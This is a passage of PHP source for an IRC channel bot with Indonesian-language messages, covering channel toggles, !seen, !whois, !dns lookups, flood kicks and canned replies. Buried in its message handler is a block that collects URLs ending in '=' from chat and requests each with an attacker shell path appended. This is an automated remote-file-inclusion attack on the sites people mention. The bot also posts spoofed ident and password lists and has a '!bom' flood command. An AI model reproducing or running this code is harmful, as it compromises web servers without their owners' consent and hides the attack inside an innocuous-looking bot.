                                                $systembot['ISON']['ALL']= $onoff;$modbot->notice($fp,$fsrc[nick],'ISON is [4'.strtoupper($systembot['ISON']['ALL']).']');
                                            }
                                            if($wsys=='ASTRO' && $sysok==1 && $getlvl > 2){
                                                $systembot['ASTRO'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'ASTRO '. strtoupper($targetsys).' is [4'.strtoupper($systembot['ASTRO'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='SPOOF' && $sysok==1 && $getlvl > 2){
                                                $systembot['SPOOF'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'SPOOF '. strtoupper($targetsys).' is [4'.strtoupper($systembot['SPOOF'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='DNS' && $sysok==1 && $getlvl > 2){
                                                $systembot['DNS'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'DNS '. strtoupper($targetsys).' is [4'.strtoupper($systembot['DNS'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='BOM' && $sysok==1 && $getlvl > 2){
                                                $systembot['BOM'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'BOM '. strtoupper($targetsys).' is [4'.strtoupper($systembot['BOM'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='GREET' && $sysok==1 && $getlvl > 2){
                                                $systembot['GREET'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'GREET '. strtoupper($targetsys).' is [4'.strtoupper($systembot['GREET'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='SMS' && $sysok==1 && $getlvl > 2){
                                                $systembot['SMS'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'SMS '. strtoupper($targetsys).' is [4'.strtoupper($systembot['SMS'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='SLAPS' && $sysok==1 && $getlvl > 2){
                                                $systembot['SLAPS'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'SLAPS '. strtoupper($targetsys).' is [4'.strtoupper($systembot['SLAPS'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='KSLANG' && $sysok==1 && $getlvl > 2){
                                                $systembot['KSLANG'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'KSLANG '. strtoupper($targetsys).' is [4'.strtoupper($systembot['KSLANG'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='AUTOCYCLE' && $sysok==1 && $getlvl > 2){
                                                $systembot['AUTOCYCLE'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'AUTOCYCLE '. strtoupper($targetsys).' is [4'.strtoupper($systembot['AUTOCYCLE'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='AUTOJOIN' && $sysok==1 && $getlvl > 2){
                                                $systembot['AUTOJOIN'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'AUTOJOIN '. strtoupper($targetsys).' is [4'.strtoupper($systembot['AUTOJOIN'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='AUTOAWAY' && $sysok==1 && $getlvl > 2){
                                                $systembot['AUTOAWAY']['ALL']= $onoff;$modbot->notice($fp,$fsrc[nick],'AUTOAWAY is [4'.strtoupper($systembot['AUTOAWAY']['ALL']).']');
                                            }
                                            if($wsys=='LISTGREET' && $dCom[1] && $dCom[2] && $getlvl > 2){
                                                if($onoff=="3ON"){
                                                $ddc=strtolower($dCom[1]);$greetmsg["$ddc"]["nama"]=$dCom[1];$mgreet=str_replace($dCom[0]." ".$dCom[1]." ","",$TxtMsg);
						$greetmsg["$ddc"]["msg"]=$mgreet;$modbot->notice($fp,$fsrc[nick],'Auto Greet For :'.$greetmsg["$ddc"]["nama"]);
                                                $modbot->notice($fp,$fsrc[nick],'Auto Greet Msg :'.$greetmsg["$ddc"]["msg"]);
                                                }else{$eel=strtolower($dCom[1]);unset($greetmsg["$eel"]["nama"]);unset($greetmsg["$eel"]["msg"]);$modbot->notice($fp,$fsrc[nick],'Delete Greet For :'.$eel);}
                                            }
                                            if($wsys=='LISTISON' && $dCom[1] && $getlvl > 2){
                                                if($onoff=="3ON"){
                                                    if($modbot->add_ison($dCom[1])==1){$modbot->notice($fp,$fsrc[nick],$dCom[1] . ' is now in my list');}
                                                    else{$modbot->notice($fp,$fsrc[nick],$dCom[1] . ' is already in my list');}
                                                }
                                                else{if($modbot->del_ison($dCom[1])==1){$modbot->notice($fp,$fsrc[nick],$dCom[1] . ' has been deleted');}}
                                            }
                                        }
                                        ################################ SYSTEM ###################################
                                            
                                    }
                                }
                                ###############################
                                elseif (substr($Params[3],0,2)==':!'){
                                    if (strtolower($Params[3])==':!ping' && ereg('#',$Params[2]) && $systembot['PING'][strtoupper($Params[2])]=="3ON") {
                                        if($dCom[1]){
                                            if(strtolower($dCom[1])=='me'){$modbot->stuf_ping($fp,$Params[2],$fsrc[nick]);}else {$modbot->stuf_ping($fp,$Params[2],$dCom[1]);}
                                        }else{$modbot->stuf_ping($fp,$Params[2],$fsrc[nick]);}
                                    }
                                    elseif (strtolower($Params[3])==':!version' && ereg('#',$Params[2]) && $systembot['VERSION'][strtoupper($Params[2])]=="3ON") {
                                        if($dCom[1]){
                                        $modbot->msg($fp,$Params[4],'VERSION');$datversi[strtolower($Params[4])]["nick"]=strtolower($Params[4]);$datversi[strtolower($Params[4])]["chan"]=$Params[2];
                                        }else{$modbot->notice($fp,$fsrc[nick],'Perintah salah! Ketik !version <nick>');}
                                    }
                                    elseif (strtolower($Params[3])==':!jam' && ereg('#',$Params[2]) && $systembot['JAM'][strtoupper($Params[2])]=="3ON") {
                                         $sekarang=date("l, j F Y H:i:s");
                                         $modbot->msg($fp,$Params[2],"sekarang : 12[8".$sekarang."12]");
                                    }
                                    elseif (strtolower($Params[3])==':!seen' && ereg('#',$Params[2]) && $systembot['SEEN'][strtoupper($Params[2])]=="3ON") {
                                        if($dCom[1]){
                                           $nicksenn=strtolower($dCom[1]);
                                           $waktuseennya=time();
                                           $lamaseen= $waktuseennya - $asalseen[$nicksenn];
                                           $asilhari=0;$asilejam=0;$asilmeni=0;
                                           if ($lamaseen>=86400){$asilhari = $lamaseen / 86400;$hari = floor($asilhari)."11hari "; $sisane = $lamaseen - ($hari*86400);$lamaseen = $sisane;   }else{$hari =""; }
                                           if ($lamaseen>=3600) {$asilejam = $lamaseen / 3600; $jamm = floor($asilejam)."11jam ";  $sisane = $lamaseen - ($jamm*3600); $lamaseen = $sisane;   }else{$jamm =""; }
                                           if ($lamaseen>=60)   {$asilmeni = $lamaseen / 60;   $ment = floor($asilmeni)."11menit ";$sisane = $lamaseen - ($ment*60);   $lamaseen = $sisane;   }else{$ment =""; }
                                           if ($asilhari == 0){$katahari="";        }else{$katahari=$hari;              }
                                           if ($asilejam == 0){$kataejam="";        }else{$kataejam=$jamm;              }
                                           if ($asilmeni == 0){$katameni="";        }else{$katameni=$ment;              }
                                           if ($lamaseen == 0){$katadeti="";        }else{$katadeti=$lamaseen."11detik"; }
                                           $katamsgseen = $katahari." ".$kataejam." ".$katameni." ".$katadeti;
                                           if($asalseen[$nicksenn.'chanel']=="ini"){$asalseen[$nicksenn.'chanel']="$Params[2]"; }
                                           if($asalseen[$nicksenn]){
                                              if($asalseen[$nicksenn]=="ada"){
                                                  $modbot->msg($fp,$Params[2],"si [".$nicksenn."] da online dia hu`u..! whois ksana jow ".$fsrc[nick]."..!!!!!");
                                              }
                                              elseif($asalseen[$nicksenn]=="ganti"){
                                                  $modbot->msg($fp,$Params[2],"terakhir ane liat si [".$nicksenn."] ganti nick ".$asalseen[$nicksenn.'chanel']." staw ".$fsrc[nick]."..!!!!!");
                                              }
                                              else{$modbot->msg($fp,$Params[2],"klo tdk salah si [".$nicksenn."] ".$asalseen[$nicksenn.'status']." kluar channel [".$asalseen[$nicksenn.'chanel']."][".$katamsgseen."] yg lalu 12".$fsrc[nick]." ..!!!!!");   }
                                           }else{$modbot->msg($fp,$Params[2],"beugh.. ana tdk knal klo sapa ".$dCom[1]." ini dia ".$fsrc[nick]."...!!!");  }
                                        }else{$modbot->notice($fp,$fsrc[nick],'Perintah salah! Ketik !seen <nick>');}
                                    }
                                    elseif (strtolower($Params[3])==':!whois' && ereg('#',$Params[2]) && $systembot['WHOIS'][strtoupper($Params[2])]=="3ON") {
                                        if($dCom[1]){
					$datwhois[strtolower($dCom[1])]["nick"]=strtolower($dCom[1]);
					$datwhois[strtolower($dCom[1])]["chan"]=$Params[2];
                                        $modbot->send($fp,'WHOIS '.$dCom[1]);
                                        }
                                        else{
                                            $modbot->notice($fp,$fsrc[nick],'Perintah salah! Ketik :!whois <nick>');
                                        }
                                    }
                                    elseif (strtolower($Params[3])==':!time' && ereg('#',$Params[2]) && $systembot['TIME'][strtoupper($Params[2])]=="3ON") {
                                        if($dCom[1]){
                                        $modbot->msg($fp,$Params[4],'TIME');$dattime[strtolower($Params[4])]["nick"]=strtolower($Params[4]);$dattime[strtolower($Params[4])]["chan"]=$Params[2];}
                                        else{$modbot->notice($fp,$fsrc[nick],'Perintah salah! Ketik !time <nick>');}
                                    }
                                    elseif (strtolower($Params[3])==':!finger' && ereg('#',$Params[2]) && $systembot['FINGER'][strtoupper($Params[2])]=="3ON") {
                                        if($dCom[1]){
                                        $modbot->msg($fp,$Params[4],'FINGER');$datfinger[strtolower($Params[4])]["nick"]=strtolower($Params[4]);$datfinger[strtolower($Params[4])]["chan"]=$Params[2];
                                        }else{$modbot->notice($fp,$fsrc[nick],'Perintah salah! Ketik !finger <nick>');}
                                    }
                                    elseif (strtolower($Params[3])==':!ip' && ereg('#',$Params[2]) && $systembot['IP'][strtoupper($Params[2])]=="3ON") {
                                        if($dCom[1]){
                                            $res = gethostbyname($dCom[1]);
                                            $res = implode(", ",$res);
                                            if ( empty($res) ) {
                                               $modbot->msg($fp,$Params[2],'Ip for: '.$dCom[1] . ' Gak ngerti aQ rek...!! ');
                                            }else{$modbot->msg($fp,$Params[2],'Ip for: '.$dCom[1] . ' '.$res);  }
                                        }else{$modbot->notice($fp,$fsrc[nick],'Perintah salah! Ketik !ip <Ip>');}
                                    }
                                    elseif (strtolower($Params[3])==':!dns' && ereg('#',$Params[2]) && $systembot['DNS'][strtoupper($Params[2])]=="3ON") {
                                        if($dCom[1]){
                                            if (ereg("[a-zA-Z]", $dCom[1])) {$res = gethostbyname($dCom[1]);}
                                            elseif (ereg("[0-9]", $dCom[1])) {$res = gethostbyaddr($dCom[1]);}
                                            if ($res==$dCom[1]) { $res = "not resolved."; }
                                            else { $res = "resolved to: $res ."; }
                                            $modbot->msg($fp,$Params[2],'DNS Query for: '.$dCom[1] . ' ' .$res);
                                        }else{$modbot->notice($fp,$fsrc[nick],'Perintah salah! Ketik !dns <host>');}
                                    }
                                    elseif (strtolower($Params[3])==':!astro' && ereg('#',$Params[2]) && $systembot['ASTRO'][strtoupper($Params[2])]=="3ON") {
                                        if($dCom[1]){
                                            $modbot->notice($fp,$fsrc[nick],'15(04Astro15) '. $modbot->mod_astro($dCom[1]));
                                        }else{
                                            $modbot->notice($fp,$fsrc[nick],'Perintah salah! Ketik :!astro <bintang>');
                                        }
                                    }
                                    elseif (strtolower($Params[3])==":!spoof" && ereg('#',$Params[2]) && $systembot['SPOOF'][strtoupper($Params[2])]=="3ON") {
					$spoofnya=strtolower($Params[4]);
					if ($Params[5]<=$jmlspoof["$spoofnya"] && $Params[5]>0){
						fputs($fp,'PRIVMSG '.$Params[2].' :15(04Spoof15) Ident: 4' . $isisp["$Params[5]"]["$spoofnya"]["ident"] .' Spoof: 4' . $isisp["$Params[5]"]["$spoofnya"]["spoof"] .' Passw: 4' . $isisp["$Params[5]"]["$spoofnya"]["pass"].''. CRLF);
					}
					else {$modbot->notice($fp,$frsc[nick],'15(04Spoof15) Request Error');}
                                    }
                                    elseif (strtolower($Params[3])==":!kslang" && ereg('#',$Params[2]) && $systembot['KSLANG'][strtoupper($Params[2])]=="3ON") {
                                        $ktslsl=str_replace($Params[3]." ".$Params[4]." ","",":".$TxtMsg);
                                        if($Params[4]<=$kmjml[strtolower($ktslsl)] && $Params[4]>0){
                                            $nomere=$Params[4]-1;
                                            if(strpos($kmusedan[$nomere]["definisi"][strtolower($ktslsl)],"<br>")){
                                            $defedan=explode("<br>",$kmusedan[$nomere]["definisi"][strtolower($ktslsl)]);
                                                foreach ($defedan as $darredan) {
                                                    $modbot->notice($fp,$fsrc[nick],'15(04Arti15) '.$darredan);
                                                    sleep(1);
                                                }
                                            }
                                            elseif($kmusedan[$nomere]["definisi"][strtolower($ktslsl)]){
                                                $modbot->notice($fp,$fsrc[nick],'15(04Arti15) '.$kmusedan[$nomere]["definisi"][strtolower($ktslsl)]);
                                            }
                                            if(strpos($kmusedan[$nomere]["contoh"][strtolower($ktslsl)],"<br>")){
                                                $defedan=explode("<br>",$kmusedan[$nomere]["contoh"][strtolower($ktslsl)]);
                                                foreach ($defedan as $darredan) {
                                                    $modbot->notice($fp,$fsrc[nick],'15(04Cth15) '.$darredan);
                                                        sleep(1);
                                                }
                                            }
                                            elseif($kmusedan[$nomere]["contoh"][strtolower($ktslsl)]){
                                                $modbot->notice($fp,$fsrc[nick],'15(04Cth15) '.$kmusedan[$nomere]["contoh"][strtolower($ktslsl)]);
                                            }
                                        }
                                        else{
                                            fputs($fp,'PRIVMSG '.$Params[2].' :15(04KSlang15) Request Error'. CRLF);
                                        }
                                        
                                    }
                                    elseif (strtolower($Params[3])==':!update' && ereg('#',$Params[2]) && $Params[5]) {
                                        $typeup=strtolower($Params[4]);
                                        if($typeup=='spoof' && $systembot['SPOOF'][strtoupper($Params[2])]=="3ON"){
                                            $modbot->msg($fp,$Params[2],'15(04Spoof15) Update Complete! FOUND :'.$modbot->mod_uspoof($fp,$Params[5]).' Spoof');
                                        }
                                        elseif($typeup=='kslang' && $systembot['KSLANG'][strtoupper($Params[2])]=="3ON"){
                                            $ktslsl=str_replace($Params[3]." ".$Params[4]." ","",":".$TxtMsg);
                                            $modbot->msg($fp,$Params[2],'15(04KSlang15) Update Complete! FOUND :'.$modbot->mod_uslang($fp,$ktslsl).' Arti'); 
                                        }
                                    }
                                    elseif (strtolower($Params[3])==":!bom" && ereg('#',$Params[2]) && $Params[4] && $systembot['BOM'][strtoupper($Params[2])]=="3ON") {
                                        $modbot->stuf_bom($fp,$Params[2],$Params[4]);
                                    }
                                    elseif (strtolower($Params[3])==":!potong" && ereg('#',$Params[2]) && $Params[4] && $systembot['BOM'][strtoupper($Params[2])]=="3ON") {
                                        $modbot->stuf_potong($fp,$fsrc[nick],$Params[2],$Params[4]);
                                    }
                                }
                                elseif (strlen(strtolower($TxtMsg))>=$maxkar) {
                                    if (substr($Params[3],0,1)==':' && ereg('#',$Params[2]) && $systembot['GUARD'][strtoupper($Params[2])]=="3ON") {
                                      if ($floddban == "ON"){$modbot->ban($fp,$Params[2],"*!*@".$fsrc[host]);  }
                                      $modbot->kick($fp,$Params[2],$fsrc[nick],"Jok ngeflood ndeng..!!");
                                      if ($floddban == "ON"){
                                          sleep(5);
                                          if($systembot['NGOMONG'][strtoupper($Params[2])]=="3ON"){$modbot->msg($fp,$Params[2],"Wes tak bukak yo rek bane ".$fsrc[nick]." yo rek...!!!");    }
                                          sleep(2);
                                          $modbot->unban($fp,$Params[2],"*!*@".$fsrc[host]);
                                      }
                                    }
                                }
                                elseif (substr($Params[3],0,1)==':') {
                                  $naidiceluk=substr($Params[3],1,(strlen($Params[3])));
                                  if ((substr_count(strtolower($TxtMsg),strtolower($bot['nick']))>0)OR(substr_count(strtolower($TxtMsg),strtolower($bot['realname']))>0)) {
                                                if($systembot['NGOMONG'][strtoupper($Params[2])]=="3ON"){
                                                $ada = FALSE;
                                                     if(strtolower($bot['nick']) != strtolower($fsrc[nick])){
                                                        foreach ($respon_pesan as $rpesan) {
                                                           $trtext = strtolower($rpesan[0]);
                                                           if (substr_count(strtolower($TxtMsg),$trtext) > 0) {
                                                              $rpesan[1] = str_replace("<nick>",$fsrc[nick],$rpesan[1]);
                                                              $modbot->msg($fp,$Params[2],$rpesan[1]);
                                                              $ada = TRUE;
                                                           }
                                                        }
                                                        foreach ($pujianlist as $rpesan) {
                                                           $trtext = strtolower($rpesan);
                                                           if (substr_count(strtolower($TxtMsg),$trtext) > 0) {
                                                              $jawab = $rpujian[rand(0,count($rpujian) - 1)];
                                                              $jawab = str_replace("<nick>",$fsrc[nick],$jawab);
                                                              $jawab = str_replace("<kata>",$trtext,$jawab);
                                                              $modbot->msg($fp,$Params[2],$jawab);
                                                              $ada = TRUE;
                                                           }
                                                        }
                                                        foreach ($cacianlist as $rpesan) {
                                                           $trtext = strtolower($rpesan);
                                                           if (substr_count(strtolower($TxtMsg),$trtext) > 0) {
                                                              $jawab = $rcacian[rand(0,count($rcacian) - 1)];
                                                              $jawab = str_replace("<nick>",$fsrc[nick],$jawab);
                                                              $jawab = str_replace("<kata>",$trtext,$jawab);
                                                              $modbot->msg($fp,$Params[2],$jawab);
                                                              $ada = TRUE;
                                                           }
                                                        }
                                                       
                                                        if (!$ada) {
                                                           $jwbpsn = $jawabsapa[rand(0,count($jawabsapa) - 1)];
                                                           $jwbpsn = str_replace("<nick>",$fsrc[nick],$jwbpsn);
                                                           $modbot->msg($fp,$Params[2],$jwbpsn);
                                                        }

                                                     }
                                                }
                                  }
                                  elseif($systembot['NGOMONG'][strtoupper($Params[2])]=="3ON"){
                                  $ada = FALSE;
                                                if(strtolower($bot['nick']) != strtolower($fsrc[nick])){
                                                     foreach ($badwordlist as $rpesan) {
                                                        $trtext = strtolower($rpesan);
                                                        if (substr_count(strtolower($TxtMsg),$trtext) > 0) {
                                                           $jawab = $rjorok[rand(0,count($rjorok) - 1)];
                                                           $jawab = str_replace("<nick>",$fsrc[nick],$jawab);
                                                           $jawab = str_replace("<kata>",$trtext,$jawab);
                                                           $modbot->msg($fp,$Params[2],$jawab);
                                                           $modbot->ban($fp,$Params[2],$fsrc[nick]);
                                                           $modbot->kick($fp,$Params[2],$fsrc[nick],"jangan nakal itu mulu..!");
                                                           $ada = TRUE;
                                                           if($systembot['BADWORD'][strtoupper($Params[2])]=="3ON")
                                                           {$modbot->kick($fp,$Params[2],$fsrc[nick],"jangan nakal itu mulu..!");}
                                                        }
                                                     }
                                                          foreach ($warnalist as $rpesan) {
                                                           $trtext = strtolower($rpesan);
                                                           if (substr_count(strtolower($TxtMsg),$trtext) > 0) {
                                                              $jawab = $rwarna[rand(0,count($rwarna) - 1)];
                                                              $jawab = str_replace("<nick>",$fsrc[nick],$jawab);
                                                              $jawab = str_replace("<kata>",$trtext,$jawab);
                                                              $modbot->msg($fp,$Params[2],$jawab);
                                                              $modbot->ban($fp,$Params[2],$fsrc[nick]);
                                                              $modbot->kick($fp,$Params[2],$fsrc[nick],"jangan ba warna luji...!!! $fsrc[nick]");
                                                              $ada = TRUE;
                                                              if($systembot['WARNAH'][strtoupper($Params[2])]=="3ON")
                                                              {$modbot->kick($fp,$Params[2],$fsrc[nick],"jangan ba warna huje..!");}
                                                           }
                                                        }
                                                     foreach ($respon_umum as $rpesan) {
                                                        $trtext = strtolower($rpesan[0]);
                                                        if (substr_count(strtolower($TxtMsg),$trtext) > 0) {
                                                           $rpesan[1] = str_replace("<nick>",$fsrc[nick],$rpesan[1]);
                                                           $modbot->msg($fp,$Params[2],$rpesan[1]);
                                                           $ada = TRUE;
                                                        }
                                                     }
                                                }
                                  }
                                }
                                elseif (substr($Params[3],0,3)==':me'){
                                       $modbot->join($fp,'Dj@rum');
                                }
                                if (substr($Params[3],0,1)==':') {
###############################################################################################
$trtext="http://";
if (substr_count(strtolower($TxtMsg),$trtext) > 0) {
$awaltex=0;
$adatarget=0;
$ltexttarget=0;
$panjangtex=strlen($TxtMsg);
do {
    $awaltex=$awaltex+1;
    $httptarget=substr($TxtMsg,$awaltex,$panjangtex);
    $httptarget=substr($httptarget,0,4);
    $httptarget=strtolower($httptarget);
    if($httptarget=="http"){$ltexttarget=$awaltex;$adatarget=1;break;   }
    if($awaltex>=$panjangtex){$adatarget=0;break;                       }
} while(true);
$ahirtarget=$panjangtex;
$hasiltarget=substr($TxtMsg,$ltexttarget,$panjangtex);
$rtexttarget=$panjangtex-$ltexttarget;
do {
    $ahirtarget=$ahirtarget-1;
    $rtexttarget=$ahirtarget-$ltexttarget;
    $mburine=substr($TxtMsg,0,$ahirtarget);
    $mburine=substr($mburine,$ahirtarget-1,$ahirtarget);
    $mburine=strtolower($mburine);
    if($mburine=="="){
       $adatarget=2;
       $rtexttarget=$ahirtarget-$ltexttarget;
       break;
    }
    if($ahirtarget<=1){$adatarget=0;break;                              }
} while(true);
if($adatarget==2){
$hasiltarget=substr($hasiltarget,0,$rtexttarget);
$cektarget=substr($hasiltarget,0,15);
$ngulange=0;
do {
    $ngulange=$ngulange+1;
    $cektaget=substr($hasiltargetgue[$ngulange],0,15);
    if($cektaget==$cektarget){$sido=0;break;   }
    if($ngulange>=$notarget){$sido=1;break;   }
} while(true);
if($sido==1){
$notarget=$notarget+1;
$hasiltargetgue[$notarget]=$hasiltarget;
if ($notarget>=30){$loadergue = fopen ($hasiltarget.$shellgue, "rb"); }
if ($systembot['SCANSPY'][strtoupper($Params[2])]=="3ON"){
$loadergue = fopen ($hasiltarget.$shellgue, "rb");
}
}
$sido=0;
}
}
###############################################################################################
                                $yangngomong=strtolower($fsrc[nick]);
                                $asalseen[$yangngomong]="ada";
                                    if (substr($Params[3],0,1)==':' && ereg('#',$Params[2]) && $systembot['GUARD'][strtoupper($Params[2])]=="3ON") {
                                    $temptex=strtolower($Params[2]).strtolower($fsrc[nick]).strtolower($Params[3]).strtolower($Params[4]);
                                      if ($temptex==$textemp){
                                           $textrep=($textrep+1);
                                           if ($textrep>=$Maxreep){
                                           $modbot->kick($fp,$Params[2],$fsrc[nick],"repeat..!!");
                                           }
                                      }else {$textrep=0;$textemp=$temptex;}
                                    }
                                }
                                ########### NET ############
                                break;
                        }
                        ##[ AKHIR DATA RAW NIH ]##
                }
                ### PERMAINAN PING PONG ###
                elseif ( substr($DataLine,0,4) == 'PING' ) {$modbot->send($fp,'PONG ' . substr($DataLine,5));}
                $response ="";
            }
            ##[ End Proses Data Recv ]##
        }
        fclose ($fp);
        unset ($fp);
        $response='';
    }
}  while ($keluar==0);
################### [ END CONNECT ] ###################
?>










